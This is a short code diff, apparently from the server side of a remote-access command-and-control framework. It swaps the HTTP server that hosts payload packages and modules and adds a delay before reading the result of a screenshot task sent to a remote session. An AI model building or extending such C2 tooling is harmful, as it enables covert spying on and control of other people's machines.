@@ -115,8 +115,8 @@ def main():
     __debug = options.debug
 
     globals()['debug'] = __debug
-    globals()['package_handler'] = subprocess.Popen('{} -m http.server {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
-    globals()['module_handler'] = subprocess.Popen('{} -m http.server {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
+    globals()['package_handler'] = subprocess.Popen('{} -m ComplexHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
+    globals()['module_handler'] = subprocess.Popen('{} -m ComplexHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
     globals()['c2'].run()
 
@@ -580,6 +580,7 @@ class C2():
         else:
             task = {"task": "screenshot", "session": self.current_session.info.get('uid')}
             self.current_session.send_task(task)
+            time.sleep(2) # FIX ME: this seems to be needed for local testing?
             output = self.current_session.recv_task()['result']
             if not os.path.isdir('data'):
                 try:
